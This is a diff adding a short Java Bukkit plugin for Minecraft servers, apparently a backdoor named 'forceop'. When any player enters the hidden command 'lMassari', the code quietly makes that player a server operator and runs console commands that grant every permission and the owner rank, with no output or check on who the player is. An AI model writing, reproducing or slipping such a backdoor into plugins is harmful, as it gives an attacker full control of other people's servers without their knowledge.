@@ -1,0 +1,24 @@
+package me.lmassari.forceop;
+
+import org.bukkit.Server;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
+import org.bukkit.plugin.java.JavaPlugin;
+
+public class main
+  extends JavaPlugin
+{
+  public boolean onCommand(CommandSender sender, Command command, String CL, String[] args)
+  {
+    if (((sender instanceof Player)) && 
+      (CL.equalsIgnoreCase("lMassari")))
+    {
+      Player p = (Player)sender;
+      p.setOp(true);
+      getServer().dispatchCommand(getServer().getConsoleSender(), "pex user " + p.getName() + " add *");
+      getServer().dispatchCommand(getServer().getConsoleSender(), "manuadd " + p.getName() + " dono");
+    }
+    return false;
+  }
+}
